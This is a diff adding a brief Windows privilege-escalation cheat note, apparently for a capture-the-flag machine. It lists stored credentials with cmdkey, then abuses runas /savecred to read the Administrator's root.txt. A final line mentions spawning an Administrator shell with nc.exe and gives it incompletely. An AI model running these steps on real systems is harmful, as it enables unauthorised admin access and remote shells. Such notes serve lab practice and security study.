@@ -1,0 +1,10 @@
+RunAs Escalation:
+
+    stored credentials:
+        cmdkey /list
+
+    Try to get admin shell and copy root.txt file in security folder:
+        C:\Windows\System32\runas.exe /user::ACCESS\ADMINISTRATOR /savecred "C:\Windows\System32\cmd.exe /c Type C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt"
+
+    If we have remote shell - Get a full shell for Administrator user using runas command with nc.exe:
+        C:\Windows\System32\runas.exe nc.exe
